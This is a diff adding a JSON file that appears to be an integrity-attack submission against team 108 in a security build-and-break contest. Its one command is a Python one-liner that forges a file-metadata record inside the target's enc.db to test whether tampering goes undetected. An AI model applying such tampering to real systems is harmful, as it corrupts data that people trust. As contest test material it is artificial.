@@ -1,0 +1,13 @@
+{
+  "target_team": 108,
+  "type": "integrity",
+  "commands": [
+    {
+      "program": "sh",
+      "args": [
+        "-c",
+        "python3 -c 'import struct;d=open(\"enc.db\",\"rb\").read();MAX=256;uc=struct.unpack_from(\"<i\",d,0)[0];ue=4+uc*(MAX+16+32);fc=struct.unpack_from(\"<i\",d,ue)[0];meta=b\"user1\"+b\"\\0\"*(MAX-5)+b\"file1\"+b\"\\0\"*(MAX-5)+b\"\\0\"*16+b\"\\0\"*16+struct.pack(\"<i\",0);open(\"enc.db\",\"wb\").write(d[:ue]+struct.pack(\"<i\",fc+1)+meta+d[ue+4:])'"
+      ]
+    }
+  ]
+}
